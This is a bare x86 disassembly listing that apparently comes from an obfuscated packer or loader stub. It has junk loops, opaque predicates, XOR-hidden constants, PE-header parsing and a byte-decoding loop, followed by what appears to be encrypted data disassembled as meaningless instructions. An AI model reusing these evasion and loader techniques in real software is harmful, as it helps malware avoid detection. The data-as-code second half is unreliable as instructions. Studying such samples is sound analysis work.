  423c80:	mov    DWORD PTR [esp+0x20],edx
  423c84:	mov    edx,DWORD PTR [esp+0x14]
  423c88:	xor    edx,0x0
  423c8b:	cmp    DWORD PTR [esp+0x20],0x70941f94
  423c93:	mov    DWORD PTR [esp+0x24],edx
  423c97:	jne    0x423ca6
  423c9d:	cmp    edx,0xffffffff
  423ca0:	je     0x423d0f
  423ca6:	mov    eax,DWORD PTR [eax+0x1c8]
  423cac:	mov    eax,DWORD PTR [eax]
  423cae:	cdq    
  423caf:	add    eax,esi
  423cb1:	adc    edx,0xffffffff
  423cb4:	and    DWORD PTR [esp+0x14],0x0
  423cb9:	xor    edx,0x0
  423cbc:	mov    DWORD PTR [esp+0x1c],edx
  423cc0:	mov    edx,DWORD PTR [esp+0xc]
  423cc4:	mov    DWORD PTR [esp+0x10],edx
  423cc8:	xor    eax,ecx
  423cca:	add    DWORD PTR [esp+0x10],esi
  423cce:	mov    edx,DWORD PTR [esp+0x10]
  423cd2:	adc    DWORD PTR [esp+0x14],0xffffffff
  423cd7:	xor    edx,ecx
  423cd9:	mov    DWORD PTR [esp+0x20],edx
  423cdd:	mov    edx,DWORD PTR [esp+0x14]
  423ce1:	xor    edx,0x0
  423ce4:	mov    DWORD PTR [esp+0x24],edx
  423ce8:	cmp    DWORD PTR [esp+0x20],eax
  423cec:	jne    0x423cfe
  423cf2:	mov    eax,DWORD PTR [esp+0x1c]
  423cf6:	cmp    edx,eax
  423cf8:	je     0x423d0f
  423cfe:	mov    eax,DWORD PTR [esp+0xc]
  423d02:	add    eax,DWORD PTR [esp+0x30]
  423d06:	mov    DWORD PTR [esp+0xc],eax
  423d0a:	jmp    0x423d6c
  423d0f:	mov    eax,ds:0x42a4f6
  423d14:	mov    edx,DWORD PTR ds:0x42a4fe
  423d1a:	xor    eax,edx
  423d1c:	mov    ds:0x42a4f6,eax
  423d21:	mov    edx,DWORD PTR ds:0x42a4f6
  423d27:	mov    eax,DWORD PTR [esp+0x2c]
  423d2b:	add    DWORD PTR [eax],edx
  423d2d:	mov    edx,DWORD PTR [esp+0xc]
  423d31:	mov    eax,ds:0x42a4f6
  423d36:	xor    edx,edi
  423d38:	add    edx,ebx
  423d3a:	xor    ebx,ebx
  423d3c:	add    edx,esi
  423d3e:	adc    ebx,0xffffffff
  423d41:	xor    edi,edi
  423d43:	xor    edx,ecx
  423d45:	xor    ebx,0x0
  423d48:	add    eax,esi
  423d4a:	adc    edi,0xffffffff
  423d4d:	xor    eax,ecx
  423d4f:	xor    edi,0x0
  423d52:	cmp    eax,edx
  423d54:	jne    0x423d6c
  423d5a:	cmp    edi,ebx
  423d5c:	jne    0x423d6c
  423d62:	mov    eax,ds:0x42a4f6
  423d67:	mov    ds:0x42a4fe,eax
  423d6c:	lea    eax,[esp+0x1b8]
  423d73:	push   eax
  423d74:	push   0x42aece
  423d79:	call   DWORD PTR ds:0x42b312
  423d7f:	cmp    eax,0xffffffff
  423d82:	jne    0x422c5a
  423d88:	push   0xf
  423d8a:	lea    eax,[esp+0x44]
  423d8e:	push   eax
  423d8f:	push   0x42af02
  423d94:	push   0x42af16
  423d99:	push   0x42af3a
  423d9e:	call   DWORD PTR ds:0x42b302
  423da4:	imul   eax,eax,0x300000
  423daa:	cmp    eax,0x1b00000
  423daf:	jne    0x422c5a
  423db5:	lea    eax,[esp+0x78]
  423db9:	push   eax
  423dba:	push   0xffffffff
  423dbc:	call   DWORD PTR ds:0x42b30a
  423dc2:	test   eax,eax
  423dc4:	jne    0x422c5a
  423dca:	mov    eax,ds:0x42a472
  423dcf:	push   0x4
  423dd1:	add    eax,0x1cc
  423dd6:	push   eax
  423dd7:	lea    eax,[esp+0x3c]
  423ddb:	push   eax
  423ddc:	call   0x423df0
  423de1:	mov    eax,DWORD PTR [esp+0x34]
  423de5:	mov    eax,DWORD PTR [eax]
  423de7:	pop    edi
  423de8:	pop    esi
  423de9:	pop    ebx
  423dea:	mov    esp,ebp
  423dec:	pop    ebp
  423ded:	ret    0xc
  423df0:	push   ebp
  423df1:	mov    ebp,esp
  423df3:	sub    esp,0x10
  423df6:	mov    eax,0xf89c85a5
  423dfb:	mov    DWORD PTR ds:0x42b222,0x14
  423e05:	cmp    DWORD PTR ds:0x42b222,0x0
  423e0c:	je     0x423e66
  423e12:	cmp    DWORD PTR ds:0x42b222,0x9
  423e19:	jbe    0x423e66
  423e1f:	jmp    0x423e38
  423e24:	push   0x42a03d
  423e29:	push   0x1
  423e2b:	push   0x1
  423e2d:	push   0x14be
  423e32:	call   DWORD PTR ds:0x42b2ee
  423e38:	cmp    DWORD PTR ds:0x42b222,0xa
  423e3f:	jne    0x423e54
  423e45:	xor    edx,edx
  423e47:	add    edx,DWORD PTR ds:0x42b222
  423e4d:	dec    edx
  423e4e:	mov    DWORD PTR ds:0x42b222,edx
  423e54:	mov    edx,DWORD PTR ds:0x42b222
  423e5a:	dec    edx
  423e5b:	mov    DWORD PTR ds:0x42b222,edx
  423e61:	jmp    0x423e05
  423e66:	mov    DWORD PTR [ebp-0x4],eax
  423e69:	and    DWORD PTR ds:0x42b1fa,0x0
  423e73:	jmp    0x423e85
  423e78:	mov    edx,DWORD PTR ds:0x42b1fa
  423e7e:	inc    edx
  423e7f:	mov    DWORD PTR ds:0x42b1fa,edx
  423e85:	cmp    DWORD PTR ds:0x42b1fa,0x19
  423e8c:	jae    0x423ece
  423e92:	cmp    DWORD PTR ds:0x42b1fa,0xc
  423e99:	jg     0x423ece
  423e9f:	jmp    0x423eaf
  423ea4:	push   0x863f
  423ea9:	call   DWORD PTR ds:0x42b2f2
  423eaf:	cmp    DWORD PTR ds:0x42b1fa,0xb
  423eb6:	jne    0x423ec9
  423ebc:	mov    edx,DWORD PTR ds:0x42b1fa
  423ec2:	inc    edx
  423ec3:	mov    DWORD PTR ds:0x42b1fa,edx
  423ec9:	jmp    0x423e78
  423ece:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  423ed5:	mov    edx,DWORD PTR ds:0x42b1aa
  423edb:	or     edx,DWORD PTR ds:0x42b1da
  423ee1:	mov    DWORD PTR ds:0x42b1aa,edx
  423ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  423eea:	not    edx
  423eec:	push   esi
  423eed:	and    edx,esi
  423eef:	mov    edx,0x75108ae
  423ef4:	xor    ecx,edx
  423ef6:	adc    DWORD PTR ds:0x42b18e,ebx
  423efc:	mov    esi,0x3272f5
  423f01:	and    DWORD PTR ds:0x42b186,0x14f5
  423f0b:	push   edi
  423f0c:	adc    edi,DWORD PTR ds:0x42b1c2
  423f12:	mov    edi,DWORD PTR [ebp+0x10]
  423f15:	xor    DWORD PTR ds:0x42b1fa,0x42b1ce
  423f1f:	add    ecx,esi
  423f21:	mov    DWORD PTR ds:0x42b1da,0x1b10
  423f2b:	cmp    ecx,edi
  423f2d:	mov    DWORD PTR ds:0x42b1d6,0x199
  423f37:	je     0x42401c
  423f3d:	xor    edi,ecx
  423f3f:	mov    ecx,DWORD PTR [ebp-0x4]
  423f42:	sbb    DWORD PTR ds:0x42b202,0x792c
  423f4c:	mov    edi,DWORD PTR [ebp+0x10]
  423f4f:	sub    DWORD PTR ds:0x42b1ba,0xd36
  423f59:	xor    eax,eax
  423f5b:	xor    ecx,edx
  423f5d:	xor    DWORD PTR ds:0x42b216,0x49be
  423f67:	add    ecx,esi
  423f69:	add    edi,0xfabdbed4
  423f6f:	adc    eax,0xffffffff
  423f72:	xor    eax,0x0
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	push   ebx
  423f79:	xor    ebx,ebx
  423f7b:	xor    edi,0x8a29a141
  423f81:	mov    eax,ecx
  423f83:	add    eax,0xfabdbed4
  423f88:	adc    ebx,0xffffffff
  423f8b:	xor    eax,0x8a29a141
  423f90:	xor    ebx,0x0
  423f93:	cmp    eax,edi
  423f95:	jne    0x423fae
  423f9b:	cmp    ebx,DWORD PTR [ebp-0xc]
  423f9e:	je     0x424016
  423fa4:	jmp    0x423fae
  423fa9:	mov    esi,0x3272f5
  423fae:	mov    eax,DWORD PTR [ebp-0x4]
  423fb1:	mov    edi,DWORD PTR [ebp-0x8]
  423fb4:	xor    edi,edx
  423fb6:	add    edi,esi
  423fb8:	mov    esi,DWORD PTR [ebp+0x8]
  423fbb:	imul   edi,ecx
  423fbe:	mov    ebx,DWORD PTR [ebp+0xc]
  423fc1:	xor    eax,edx
  423fc3:	add    eax,ecx
  423fc5:	mov    al,BYTE PTR [ebx+eax*1+0x3272f5]
  423fcc:	mov    BYTE PTR [edi+esi*1],al
  423fcf:	mov    eax,DWORD PTR [ebp-0x8]
  423fd2:	mov    esi,DWORD PTR [ebp+0x10]
  423fd5:	xor    eax,edx
  423fd7:	xor    ebx,ebx
  423fd9:	add    esi,0xfabdbed4
  423fdf:	adc    ebx,0xffffffff
  423fe2:	lea    ecx,[ecx+eax*1+0x3272f5]
  423fe9:	xor    edi,edi
  423feb:	xor    esi,0x8a29a141
  423ff1:	xor    ebx,0x0
  423ff4:	mov    eax,ecx
  423ff6:	add    eax,0xfabdbed4
  423ffb:	adc    edi,0xffffffff
  423ffe:	xor    eax,0x8a29a141
  424003:	xor    edi,0x0
  424006:	cmp    eax,esi
  424008:	jne    0x423fa9
  42400e:	cmp    edi,ebx
  424010:	jne    0x423fa9
  424016:	mov    eax,0xf89c85a2
  42401b:	pop    ebx
  42401c:	pop    edi
  42401d:	pop    esi
  42401e:	leave  
  42401f:	ret    0xc
  424022:	push   ebp
  424023:	mov    ebp,esp
  424025:	push   ecx
  424026:	and    DWORD PTR ds:0x42b19e,0x0
  424030:	jmp    0x424043
  424035:	xor    eax,eax
  424037:	xor    eax,DWORD PTR ds:0x42b19e
  42403d:	inc    eax
  42403e:	mov    ds:0x42b19e,eax
  424043:	cmp    DWORD PTR ds:0x42b19e,0x14
  42404a:	jae    0x424072
  424050:	cmp    DWORD PTR ds:0x42b19e,0x1e
  424057:	jg     0x424072
  42405d:	jmp    0x42406d
  424062:	push   0x42b182
  424067:	call   DWORD PTR ds:0x42b2f6
  42406d:	jmp    0x424035
  424072:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424079:	and    DWORD PTR ds:0x42b1b2,0x0
  424083:	xor    ecx,ecx
  424085:	xor    ecx,DWORD PTR ds:0x42b1b2
  42408b:	inc    ecx
  42408c:	mov    DWORD PTR ds:0x42b1b2,ecx
  424092:	cmp    DWORD PTR ds:0x42b1b2,0x4
  424099:	jle    0x4240e5
  42409f:	jmp    0x4240be
  4240a4:	push   0x42b206
  4240a9:	push   0x42b1c6
  4240ae:	push   0x6e36
  4240b3:	push   0x42a0fe
  4240b8:	call   DWORD PTR ds:0x42b2fa
  4240be:	cmp    DWORD PTR ds:0x42b1b2,0x3
  4240c5:	jne    0x4240d8
  4240cb:	mov    ecx,DWORD PTR ds:0x42b1b2
  4240d1:	inc    ecx
  4240d2:	mov    DWORD PTR ds:0x42b1b2,ecx
  4240d8:	cmp    DWORD PTR ds:0x42b1b2,0x1b
  4240df:	jb     0x424083
  4240e5:	mov    eax,DWORD PTR [ebp+0x8]
  4240e8:	movsx  eax,BYTE PTR [eax]
  4240eb:	mov    edx,0x3272f5
  4240f0:	sub    eax,edx
  4240f2:	mov    ecx,0x75108ae
  4240f7:	xor    eax,ecx
  4240f9:	cmp    eax,0xf89c85f6
  4240fe:	jne    0x42412d
  424104:	mov    eax,DWORD PTR [ebp+0x8]
  424107:	push   esi
  424108:	mov    esi,DWORD PTR [ebp+0x8]
  42410b:	add    esi,DWORD PTR [eax+0x3c]
  42410e:	mov    DWORD PTR [ebp+0x8],esi
  424111:	mov    eax,DWORD PTR [ebp-0x4]
  424114:	mov    esi,DWORD PTR [ebp+0x8]
  424117:	xor    eax,ecx
  424119:	add    eax,edx
  42411b:	cmp    DWORD PTR [esi+0x54],eax
  42411e:	pop    esi
  42411f:	je     0x42412d
  424125:	mov    eax,DWORD PTR [ebp+0x8]
  424128:	jmp    0x424134
  42412d:	mov    eax,DWORD PTR [ebp-0x4]
  424130:	xor    eax,ecx
  424132:	add    eax,edx
  424134:	leave  
  424135:	ret    0x4
  424138:	push   ebp
  424139:	mov    ebp,esp
  42413b:	sub    esp,0xc
  42413e:	and    DWORD PTR ds:0x42b1c6,0x0
  424148:	jmp    0x42415a
  42414d:	mov    edx,DWORD PTR ds:0x42b1c6
  424153:	inc    edx
  424154:	mov    DWORD PTR ds:0x42b1c6,edx
  42415a:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  424161:	jae    0x4241a8
  424167:	cmp    DWORD PTR ds:0x42b1c6,0xd
  42416e:	jle    0x4241a8
  424174:	jmp    0x424189
  424179:	push   0x42b216
  42417e:	push   0x42a1f3
  424183:	call   DWORD PTR ds:0x42b2fe
  424189:	cmp    DWORD PTR ds:0x42b1c6,0xc
  424190:	jne    0x4241a3
  424196:	mov    edx,DWORD PTR ds:0x42b1c6
  42419c:	inc    edx
  42419d:	mov    DWORD PTR ds:0x42b1c6,edx
  4241a3:	jmp    0x42414d
  4241a8:	push   esi
  4241a9:	and    DWORD PTR ds:0x42b222,0x0
  4241b3:	xor    esi,esi
  4241b5:	or     esi,DWORD PTR ds:0x42b222
  4241bb:	inc    esi
  4241bc:	mov    DWORD PTR ds:0x42b222,esi
  4241c2:	cmp    DWORD PTR ds:0x42b222,0x7
  4241c9:	jl     0x424211
  4241cf:	jmp    0x4241ea
  4241d4:	push   DWORD PTR [ebp-0x28]
  4241d7:	push   DWORD PTR [ebp-0x24]
  4241da:	push   0x42a1b7
  4241df:	push   0x400000
  4241e4:	call   DWORD PTR ds:0x42b306
  4241ea:	cmp    DWORD PTR ds:0x42b222,0x6
  4241f1:	jne    0x424204
  4241f7:	mov    esi,DWORD PTR ds:0x42b222
  4241fd:	inc    esi
  4241fe:	mov    DWORD PTR ds:0x42b222,esi
  424204:	cmp    DWORD PTR ds:0x42b222,0x15
  42420b:	jb     0x4241b3
  424211:	mov    esi,0xf89c85a5
  424216:	or     DWORD PTR ds:0x42b1d6,0x459e
  424220:	mov    DWORD PTR [ebp-0x8],esi
  424223:	and    DWORD PTR ds:0x42b1d6,0x0
  42422d:	jmp    0x424241
  424232:	xor    ecx,ecx
  424234:	xor    ecx,DWORD PTR ds:0x42b1d6
  42423a:	inc    ecx
  42423b:	mov    DWORD PTR ds:0x42b1d6,ecx
  424241:	cmp    DWORD PTR ds:0x42b1d6,0x1c
  424248:	jae    0x42428f
  42424e:	cmp    DWORD PTR ds:0x42b1d6,0xf
  424255:	jge    0x42428f
  42425b:	jmp    0x424270
  424260:	push   0x42a1a1
  424265:	push   0x0
  424267:	push   DWORD PTR [ebp-0x20]
  42426a:	call   DWORD PTR ds:0x42b30e
  424270:	cmp    DWORD PTR ds:0x42b1d6,0xe
  424277:	jne    0x42428a
  42427d:	mov    ecx,DWORD PTR ds:0x42b1d6
  424283:	inc    ecx
  424284:	mov    DWORD PTR ds:0x42b1d6,ecx
  42428a:	jmp    0x424232
  42428f:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424296:	push   edi
  424297:	mov    eax,eax
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	mov    edi,DWORD PTR [ebp-0x8]
  42429f:	mov    ecx,0x75108ae
  4242a4:	xor    eax,ecx
  4242a6:	xor    edi,ecx
  4242a8:	mov    edx,0x3272f5
  4242ad:	add    edi,edx
  4242af:	add    eax,edx
  4242b1:	imul   eax,edi
  4242b4:	mov    edi,DWORD PTR [ebp+0xc]
  4242b7:	jmp    0x42587d
  4242bc:	jge    0x42427f
  4242be:	jnp    0x42427a
  4242c0:	mov    bh,0xb2
  4242c2:	mov    dl,0xbe
  4242c4:	jmp    0x7a2776ec
  4242c9:	pop    esi
  4242ca:	ja     0x4242e8
  4242cc:	xchg   edx,eax
  4242cd:	xchg   ebp,eax
  4242ce:	add    BYTE PTR [ebx-0x7c7c9328],0x70
  4242d5:	sub    BYTE PTR [ebx+0x3a8b0af0],dh
  4242db:	inc    ebx
  4242dc:	mov    dl,0x1f
  4242de:	stc    
  4242df:	loopne 0x4242a2
  4242e1:	xchg   esi,eax
  4242e2:	pop    es
  4242e3:	scas   al,BYTE PTR es:[edi]
  4242e4:	dec    edi
  4242e5:	push   ss
  4242e6:	loope  0x4242e8
  4242e8:	sbb    dl,BYTE PTR [edx]
  4242ea:	xchg   ebp,eax
  4242eb:	mov    esi,0x317373b9
  4242f0:	sbb    edx,DWORD PTR [esi]
  4242f2:	cwde   
  4242f3:	nop
  4242f4:	ficom  DWORD PTR [eax+0x15]
  4242f7:	retf   
  4242f8:	mov    dl,0x9
  4242fb:	sahf   
  4242fc:	in     eax,0x64
  4242fe:	mov    al,ds:0x2a5e41fd
  424303:	and    cl,BYTE PTR ds:0xa6bffccc
  424309:	dec    edx
  42430a:	imul   esi,DWORD PTR [edx+0x73],0x63
  42430e:	and    dl,BYTE PTR [eax-0x8bd57bd]
  424314:	sub    al,0x77
  424316:	sub    esi,DWORD PTR [edx]
  424318:	mov    bh,0x8a
  42431a:	pop    ebx
  42431b:	loope  0x424343
  42431d:	mov    edx,0xeb0929ad
  424322:	int3   
  424323:	xchg   esp,eax
  424324:	scas   al,BYTE PTR es:[edi]
  424325:	jle    0x424352
  424327:	repnz cs pop ecx
  42432a:	(bad)  
  42432b:	out    0xeb,al
  42432d:	es leave 
  42432f:	xchg   ebx,eax
  424330:	push   ebx
  424331:	jmp    0x17ab:0xc8ff6129
  424338:	push   ebp
  424339:	jb     0x424384
  42433b:	icebp  
  42433c:	fwait
  42433d:	neg    BYTE PTR [ecx+0x585ee2f1]
  424343:	jle    0x42430e
  424345:	leave  
  424346:	mov    ?,WORD PTR [eax+0x17a20187]
  42434c:	mov    bh,BYTE PTR [eax+0x7]
  42434f:	dec    BYTE PTR [edx]
  424351:	sbb    ebx,DWORD PTR [edx]
  424353:	repz arpl WORD PTR [edx-0x59],sp
  424357:	xchg   ebp,eax
  424358:	sub    edi,esi
  42435a:	cmp    dh,BYTE PTR [eax+0x58]
  42435d:	fbstp  TBYTE PTR [ebp+0x9c8363e]
  424363:	test   DWORD PTR [edi+esi*4-0x59],ebx
  424367:	sbb    edx,DWORD PTR [edx+0x7079151b]
  42436d:	(bad)  
  42436f:	adc    al,BYTE PTR [ecx-0x4b]
  424372:	cdq    
  424373:	aaa    
  424374:	xchg   ebp,eax
  424375:	inc    ebx
  424376:	jnp    0x4243bb
  424378:	int3   
  424379:	cmp    eax,0xf12914a6
  42437e:	pop    eax
  42437f:	adc    DWORD PTR [esp+esi*1],0x35
  424383:	add    al,0x60
  424385:	pop    ebx
  424386:	adc    bh,BYTE PTR [esi+0x398eb887]
  42438c:	add    BYTE PTR [esi],ah
  42438e:	loop   0x4243a0
  424390:	mov    eax,ds:0x12d84b0d
  424395:	push   cs
  424396:	add    esp,DWORD PTR [eax]
  424398:	cli    
  424399:	sti    
  42439a:	ja     0x4243d2
  42439c:	stc    
  42439d:	les    eax,FWORD PTR [esi+0xd441fe1]
  4243a3:	mov    WORD PTR [ebp-0x3d2115b9],fs
  4243a9:	pushf  
  4243aa:	jns    0x424380
  4243ac:	enter  0x3146,0x9c
  4243b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b1:	adc    eax,0x73f20a42
  4243b6:	mov    esp,0xf12a396b
  4243bb:	jecxz  0x4243e1
  4243bd:	jp     0x424374
  4243bf:	push   ebp
  4243c0:	das    
  4243c1:	scas   eax,DWORD PTR es:[edi]
  4243c2:	scas   eax,DWORD PTR es:[edi]
  4243c3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4243c5:	dec    edx
  4243c6:	clc    
  4243c7:	test   BYTE PTR [edi-0x72],cl
  4243ca:	or     eax,0xd72227bb
  4243cf:	and    ah,BYTE PTR [edi]
  4243d1:	in     eax,0xb7
  4243d3:	cwde   
  4243d4:	cs jge 0x424365
  4243d7:	les    edx,FWORD PTR ds:0x125e7a25
  4243dd:	arpl   WORD PTR [ebx],ax
  4243df:	rol    BYTE PTR ds:0x32ec5a47,1
  4243e5:	mov    ebp,0xc6dee783
  4243ea:	iret   
  4243eb:	lahf   
  4243ec:	cwde   
  4243ed:	ja     0x42439d
  4243ef:	mov    WORD PTR [eax+0x20],cs
  4243f2:	or     al,0xb3
  4243f4:	mov    es,WORD PTR [ebx]
  4243f6:	fstp   st(0)
  4243f8:	(bad)  
  4243f9:	jl     0x424442
  4243fb:	sbb    bl,BYTE PTR [edx]
  4243fd:	xor    BYTE PTR [edx-0x179401f9],al
  424403:	mov    BYTE PTR [ebx+0x0],0x33
  424407:	out    dx,al
  424408:	loope  0x424453
  42440a:	(bad)  
  42440b:	mov    eax,0xe09f1f33
  424410:	inc    esi
  424411:	ins    BYTE PTR es:[edi],dx
  424412:	lods   al,BYTE PTR ds:[esi]
  424413:	xor    BYTE PTR [eax+0x78],0x40
  424417:	mul    DWORD PTR [edx]
  424419:	cli    
  42441a:	fisubr DWORD PTR gs:[ebp-0x2c]
  42441e:	cmp    DWORD PTR [ebp+0x781b3bdf],edi
  424424:	call   0x4e7b5ef6
  424429:	and    DWORD PTR [ebx],0xffffffcf
  42442c:	pop    esi
  42442d:	push   ebp
  42442e:	and    al,0x7d
  424430:	xchg   edx,eax
  424431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424432:	ss pop ecx
  424434:	ficom  WORD PTR [ecx]
  424436:	xchg   ebp,eax
  424437:	fwait
  424438:	lock imul esp,DWORD PTR [esi],0xffffffc5
  42443c:	pusha  
  42443d:	std    
  42443e:	pop    ss
  42443f:	jb     0x42444d
  424441:	add    DWORD PTR [eax],eax
  424443:	pop    ebx
  424444:	int    0x34
  424446:	sub    al,0xea
  424448:	cmp    DWORD PTR [esi+0x4e11f40],ebx
  42444e:	add    ecx,DWORD PTR [ecx]
  424450:	xchg   edi,eax
  424451:	fcmovu st,st(6)
  424453:	sub    al,0x98
  424455:	ds scas al,BYTE PTR es:[edi]
  424457:	pop    eax
  424458:	sub    al,dl
  42445a:	push   cs
  42445b:	push   esi
  42445c:	xor    al,0x39
  42445e:	out    dx,al
  42445f:	cmp    BYTE PTR [edi+eax*8-0x17cfbb71],bl
  424466:	stc    
  424467:	xor    ebp,DWORD PTR [eax+0x31e319bd]
  42446d:	pop    eax
  42446e:	(bad)  
  424470:	push   ds
  424471:	cmc    
  424472:	add    al,0xcc
  424474:	pushf  
  424475:	in     eax,0x2a
  424477:	xor    al,0x50
  424479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42447a:	inc    esp
  42447b:	cmp    BYTE PTR [ebp+0x3c],dl
  42447e:	cmp    DWORD PTR [edi+0xa],ebx
  424481:	scas   al,BYTE PTR es:[edi]
  424482:	and    edx,DWORD PTR [edi-0x77]
  424485:	mov    eax,0x16538b15
  42448a:	push   ebp
  42448b:	push   ebp
  42448c:	repnz shl BYTE PTR [ebx+0x3],cl
  424490:	pop    esp
  424491:	in     al,0xc2
  424493:	push   ebx
  424494:	and    al,0xaa
  424496:	inc    ebx
  424497:	cmp    edi,0xffffffa1
  42449a:	lods   al,BYTE PTR ds:[esi]
  42449b:	and    dl,ah
  42449d:	sbb    BYTE PTR [eax+0x29],dl
  4244a0:	or     BYTE PTR [edi-0x5386f332],bh
  4244a6:	or     edi,DWORD PTR [ecx]
  4244a8:	pop    esp
  4244a9:	inc    esp
  4244aa:	jo     0x4244d5
  4244ac:	in     al,dx
  4244ad:	mov    edx,0x5e7d7054
  4244b2:	bound  edi,QWORD PTR [eax+0x564239cb]
  4244b8:	ror    BYTE PTR [edi],1
  4244ba:	xor    edx,DWORD PTR [edx+0x7cc9eb60]
  4244c0:	cmp    DWORD PTR [ebx],edi
  4244c2:	pop    ss
  4244c3:	stos   DWORD PTR es:[edi],eax
  4244c4:	fisub  DWORD PTR ds:[esi-0x45c74710]
  4244cb:	std    
  4244cc:	out    dx,al
  4244cd:	ret    0xd6a
  4244d0:	adc    eax,0x5ae1a64a
  4244d5:	dec    ebx
  4244d6:	fs pop edx
  4244d8:	mov    ?,WORD PTR [edi]
  4244da:	or     esi,DWORD PTR [edi]
  4244dc:	mov    dh,0x3b
  4244de:	repnz add al,0xf8
  4244e1:	pusha  
  4244e2:	mov    dl,0xb3
  4244e4:	xchg   BYTE PTR [edi-0x7d],cl
  4244e7:	mov    ebx,0xc0d701b0
  4244ec:	shl    BYTE PTR [ecx],0xdb
  4244ef:	(bad)  
  4244f0:	(bad)  
  4244f1:	jmp    0xca046ac7
  4244f6:	push   esp
  4244f7:	sub    al,0xea
  4244f9:	dec    ebp
  4244fa:	mov    ds:0xab05758c,al
  4244ff:	int    0x68
  424501:	ins    DWORD PTR es:[edi],dx
  424502:	dec    ebp
  424503:	xchg   ecx,eax
  424504:	add    al,0x42
  424506:	adc    eax,0xad1744c0
  42450b:	or     eax,0x418e803f
  424510:	sti    
  424511:	cmp    dl,ah
  424513:	push   ss
  424514:	add    dl,BYTE PTR [eax+0x1a5c3cd1]
  42451a:	clc    
  42451b:	push   ebp
  42451c:	xchg   ebx,eax
  42451d:	xchg   ecx,eax
  42451e:	shl    al,1
  424520:	pushf  
  424521:	lea    esp,[edx]
  424523:	mov    al,ds:0x2e883264
  424528:	mov    cl,0x3c
  42452a:	repnz xor dl,BYTE PTR [eax-0x35622f90]
  424531:	cmp    cl,BYTE PTR [edi+edx*2]
  424534:	xor    al,0xcd
  424536:	fwait
  424537:	add    DWORD PTR [edx+0x57],edx
  42453a:	ins    BYTE PTR es:[edi],dx
  42453b:	scas   eax,DWORD PTR es:[edi]
  42453c:	cmp    al,0xd7
  42453e:	div    ch
  424540:	xor    dh,BYTE PTR [ecx+edi*2-0x2]
  424544:	and    dh,cl
  424546:	hlt    
  424547:	cli    
  424548:	imul   esp,DWORD PTR ds:0xdec06f3e,0x7d
  42454f:	cmp    al,0x8b
  424551:	jle    0x4244e3
  424553:	mov    dh,0xc5
  424555:	aam    0x35
  424557:	cmp    DWORD PTR [ebp+0x33],eax
  42455a:	mov    ?,WORD PTR [ecx-0x7c]
  42455d:	xchg   ecx,eax
  42455e:	mov    dh,0x48
  424560:	cmp    al,0x95
  424562:	sti    
  424563:	jae    0x4245ab
  424565:	dec    edi
  424566:	add    eax,0x59cc3d16
  42456b:	pop    ebp
  42456c:	dec    edi
  42456d:	mov    bh,0xf7
  42456f:	cmp    al,0x27
  424571:	cli    
  424572:	add    dl,bh
  424574:	fidivr WORD PTR [ecx-0x4ee0b8d5]
  42457a:	in     eax,dx
  42457b:	xor    eax,0xab2400c3
  424580:	addr16 loopne 0x42451b
  424583:	xchg   ebx,eax
  424584:	xor    al,0x25
  424586:	push   esi
  424587:	mov    esi,0x8b46ae1
  42458c:	add    ch,BYTE PTR [ebp-0x663f9298]
  424592:	push   ss
  424593:	push   esi
  424594:	fstp   DWORD PTR [ecx-0x22]
  424597:	repz dec edi
  424599:	mov    ebp,eax
  42459b:	cmp    eax,ecx
  42459d:	dec    edi
  42459e:	cwde   
  42459f:	rcl    eax,1
  4245a1:	cmc    
  4245a2:	and    ebp,DWORD PTR [ecx+0x10e07da]
  4245a8:	cdq    
  4245a9:	adc    al,0x7c
  4245ab:	push   esp
  4245ac:	enter  0x5b16,0xdb
  4245b0:	pop    ecx
  4245b1:	in     eax,0x6d
  4245b3:	lods   eax,DWORD PTR ds:[esi]
  4245b4:	sbb    DWORD PTR [eax-0x2bb3add3],ebx
  4245ba:	ins    DWORD PTR es:[edi],dx
  4245bb:	adc    BYTE PTR [edi],0x31
  4245be:	std    
  4245bf:	idiv   BYTE PTR [ecx+0x7fecaeb2]
  4245c5:	sub    ch,BYTE PTR [edx-0x8b59aeb]
  4245cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245cc:	dec    ecx
  4245cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245ce:	(bad)  
  4245cf:	sub    eax,0x428819f9
  4245d4:	idiv   bl
  4245d6:	fsubr  DWORD PTR [edi+0x6]
  4245d9:	or     ah,0x85
  4245dc:	(bad)  
  4245dd:	jo     0x42465b
  4245df:	scas   al,BYTE PTR es:[edi]
  4245e0:	add    al,0x81
  4245e2:	xchg   di,di
  4245e5:	cmp    DWORD PTR [esi],edx
  4245e7:	pop    ebp
  4245e8:	dec    ebp
  4245e9:	jmp    0xab83:0xbae7bf0d
  4245f0:	mov    al,ds:0x46c8b92c
  4245f5:	adc    eax,0x209f14b2
  4245fa:	push   edx
  4245fb:	test   BYTE PTR [edx+0x3e],0x6c
  4245ff:	mov    eax,ds:0xff898345
  424604:	adc    bl,BYTE PTR [edi]
  424606:	shr    BYTE PTR [ecx+0x35],cl
  424609:	or     DWORD PTR [ecx],eax
  42460b:	push   0x18797df6
  424610:	inc    ecx
  424611:	mov    BYTE PTR [eax-0x3c],dl
  424614:	or     dl,BYTE PTR [ebp+0x67]
  424617:	cmp    eax,0x18481e49
  42461c:	pop    eax
  42461d:	stos   BYTE PTR es:[edi],al
  42461e:	(bad)  
  42461f:	dec    edi
  424620:	push   ebx
  424621:	adc    ecx,DWORD PTR [edx+0x50]
  424624:	dec    esp
  424625:	aad    0x82
  424627:	inc    ecx
  424628:	xor    dl,BYTE PTR [eax+0x126129a6]
  42462e:	inc    eax
  42462f:	jg     0x42461f
  424631:	call   0x57fb:0x43dd62d6
  424638:	loopne 0x424628
  42463a:	mov    WORD PTR [esi-0x29],ss
  42463d:	dec    eax
  42463e:	rep outs dx,BYTE PTR ds:[esi]
  424640:	cmp    al,0xdb
  424642:	xor    dl,BYTE PTR [esi+0x28]
  424645:	pop    ebp
  424646:	dec    edi
  424647:	mov    cl,0xb7
  424649:	xlat   BYTE PTR ds:[ebx]
  42464a:	pop    ecx
